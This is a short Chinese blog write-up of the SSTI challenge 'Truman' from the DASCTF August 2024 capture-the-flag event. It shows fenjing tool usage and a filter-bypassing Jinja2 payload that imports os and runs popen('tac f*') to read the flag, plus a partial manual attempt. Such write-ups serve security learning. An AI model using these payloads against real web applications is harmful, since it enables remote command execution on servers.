+++
title = "DASCTF2024八月"
slug = "dasctf-2024-august"
description = ""
date = "2024-08-25T15:41:58"
lastmod = "2024-08-25T15:41:58"
image = ""
license = ""
categories = ["赛题"]
tags = ["ssti"]
+++

# 0x01 前言

这次重复比赛了，但是还是可以看看那，nep坐牢了师傅们(哭)

# 0x02 题

## Truman

`fuzz`一下发现

- `[]`
- `\`
- `.`
- `""`
- `_`

没有了

而且过滤了很多的关键字

那么就构造payload来绕过吧

我自己的话是卡在这一步了,小数点的`attr`无法绕过了，用不了`chr`,于是了解到`fenjing`这个工具

```shell
pip install fenjing
python -m fenjing webui
# python -m fenjing scan --url 'http://xxxx:xxx'
```

```
POST:
code={%set kx='OS'|lower%}{%set mn=lipsum|escape|batch(22)|first|last%}{%set gl=mn*2~'g''lobals'~mn*2%}{%set ge=mn*2~'g''etitem'~mn*2%}{%set bi=mn*2~'builtins'~mn*2%}{%set im=mn*2~'import'~mn*2%}{{((cycler|attr('next')|attr(gl)|attr(ge)(bi)|attr(ge)(im))(kx)|attr('p''open'))('tac f*')|attr('r''ead')()}}
```

最后得手了

其实我自己构造的时候是卡在了

```
{% set po=dict(po=a,p=a)|join%}{% set a=(()|select|string|list)|attr(po)(24)%}{% set ini = (a, a, ('in' + 'it'), a, a) | join %}{% set glo = (a, a, ('gl' + 'obals'), a, a) | join %}{% set geti = (a, a, ('ge' + 'titem'), a, a) | join %}{% set buil = (a, a, ('buil' + 'tins'), a, a) | join %}{% set x=(x|attr(ini)|attr(glo)|attr(geti))(buil)%}
```

最后那个小数点是怎么都绕不过，绕过的话我就直接`openflag`了

# 0x03 小结

不仅要会自己构造部分payload还要会合理的使用工具
